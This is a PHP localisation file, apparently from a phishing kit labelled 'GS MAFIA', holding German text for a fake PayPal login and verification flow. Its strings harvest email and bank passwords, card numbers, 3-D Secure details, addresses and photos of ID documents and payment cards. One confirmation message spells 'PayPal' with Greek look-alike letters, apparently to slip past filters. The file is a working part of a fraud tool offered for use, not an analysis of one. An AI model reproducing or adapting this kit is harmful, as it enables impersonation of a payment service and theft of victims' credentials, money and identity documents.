<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "E-Mail";
$gs_string2 = "Weiter";
$gs_string3 = "Haben Sie Probleme beim Einloggen?";
$gs_string4 = "oder";
$gs_string5 = "Registrieren";
$gs_string6 = "Kontaktiere uns";
$gs_string7 = "Datenschutz";
$gs_string8 = "Legal";
$gs_string9 = "Weltweit";
$gs_string10 = "Ändern";
$gs_string11 = "Einloggen";
$gs_string12 = "Ihre Sicherheit ist unsere oberste Priorität";
$gs_string13 = "Aktualisieren Sie Ihre Rechnungsadresse";
$gs_string14 = "Vorname";
$gs_string15 = "Nachname";
$gs_string16 = "Adresse der Straße";
$gs_string17 = "Stadt";
$gs_string18 = "Postleitzahl";
$gs_string19 = "Weiter";
$gs_string20 = "Feedback";
$gs_string21 = "Karteninformationen aktualisieren";
$gs_string22 = "Karteninhaber Name";
$gs_string23 = "Monat";
$gs_string24 = "Jahr";
$gs_string25 = "3-D Secure Verification";
$gs_string26 = "Aktualisiere deinen E-Mail Zugang";
$gs_string27 = "E-Mail Adresse";
$gs_string28 = "E-Mail-Adresse Passwort";
$gs_string29 = "Eine Kopie Ihres Personalausweises anhängen";
$gs_string30 = "Fügen Sie ein Bild Ihrer Karte (Rückseite / Vorderseite)";
$gs_string31 = "Fertig";
$gs_string32 = "Passwort";
$gs_string33 = "Karteninformationen";
$gs_string34 = "Kartennummer";
$gs_string35 = "Land";
$gs_string36 = "Herzlichen Glückwunsch";
$gs_string37 = "<center> Ihre eingereichten Kontoinformationen werden von unseren Mitarbeitern überprüft. In der Zwischenzeit können Sie mit einer verstärkten Sicherheit auf Ihr Konto zugreifen. <br> <br> <b> Vielen Dank, dass Sie sich entschieden haben ΡayΡal. </ B> <br> <br> <center> <br> <b> Sie werden weitergeleitet, um sich in Ihrem Konto anzumelden ΡayΡal ... </ b> <br> <br> ";
$gs_string38 = "Kontoverifizierung - Sicherheitscenter";
$gs_string39 = "Melden Sie sich bei Ihrem PayPal-Konto an";
$gs_string40 = "Kontoverifizierung - Sicherheitscenter";
$gs_stringbk26 = "Aktualisiere deine Bank Login";
$gs_stringbk27 = "Login Userame";
$gs_stringbk28 = "Login Passwort";
$gs_stringbk29 = "Bankname";
$gs_idsub = "Bitte bestätigen Sie Ihre Identität";
$gs_idsub2 = "Foto Ihres ID-Dokuments (beide Seiten für den Führerschein oder die ID-Karte) neben der Vorderseite Ihrer Zahlungskarte.";
?>